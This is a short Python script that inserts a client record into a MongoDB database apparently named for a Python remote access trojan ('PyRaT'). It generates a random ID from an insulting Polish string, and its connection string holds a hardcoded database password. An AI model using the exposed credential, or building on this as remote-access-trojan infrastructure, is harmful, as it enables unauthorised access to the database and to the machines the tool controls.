import random
from pymongo import MongoClient

password = "SB5aaHgp2IYtT72e"
connection_string = f"mongodb+srv://client:{password}@pyratclients.yq8xdfc.mongodb.net/?retryWrites=true&w=majority"

client = MongoClient(connection_string)
mydb = client["PyRaT"]
mycol = mydb["clients"]
id = ""
a = "JebacWikiegoSzmate"
for i in range(10):
    id = id + (a[random.randint(0, len(a)-1)])
print(id)


IP = "localhost"
PORT = 8000
mydict = {
    "_id": f"{id}",
    "name": "0",
    "first_connection?" : True,
    "ip" : f"{IP}",
    "port" : f"{PORT}",
    "client_ip": "0"
        }

x = mycol.insert_one(mydict)
print(x.inserted_id)